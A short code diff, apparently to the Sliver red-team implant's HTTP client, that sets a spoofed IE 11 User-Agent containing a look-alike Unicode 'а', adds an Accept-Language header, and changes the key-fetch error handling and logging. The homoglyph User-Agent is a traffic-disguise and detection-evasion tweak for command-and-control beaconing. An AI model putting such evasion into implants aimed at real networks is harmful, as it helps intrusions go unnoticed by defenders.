@@ -40,6 +40,8 @@ import (
 )
 
 const (
+	// IE 11 User-agent with a unicode 'a'
+	defaultUserAgent  = "Mozillа/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
 	defaultNetTimeout = time.Second * 60
 	defaultReqTimeout = time.Second * 60 // Long polling, we want a large timeout
 )
@@ -100,7 +102,8 @@ func (s *SliverHTTPClient) SessionInit() error {
 
 func (s *SliverHTTPClient) newHTTPRequest(method, uri string, body io.Reader) *http.Request {
 	req, _ := http.NewRequest(method, uri, body)
-	req.Header.Set("User-Agent", "")
+	req.Header.Set("User-Agent", defaultUserAgent)
+	req.Header.Set("Accept-Language", "en-US")
 	return req
 }
 
@@ -111,17 +114,20 @@ func (s *SliverHTTPClient) getPublicKey() *rsa.PublicKey {
 	// {{end}}
 	req := s.newHTTPRequest(http.MethodGet, uri, nil)
 	resp, err := s.Client.Do(req)
-	if err != nil || resp.StatusCode != 200 {
+	if err != nil {
 		// {{if .Debug}}
-		log.Printf("Failed to fetch server public key")
+		log.Printf("[http] Failed to fetch server public key: %v", err)
 		// {{end}}
 		return nil
 	}
+	// {{if .Debug}}
+	log.Printf("[http] <- %d Server key response", resp.StatusCode)
+	// {{end}}
 	data, _ := ioutil.ReadAll(resp.Body)
 	pubKeyBlock, _ := pem.Decode(data)
 	if pubKeyBlock == nil {
 		// {{if .Debug}}
-		log.Printf("Failed to parse certificate PEM")
+		log.Printf("[http] Failed to parse certificate PEM")
 		// {{end}}
 		return nil
 	}
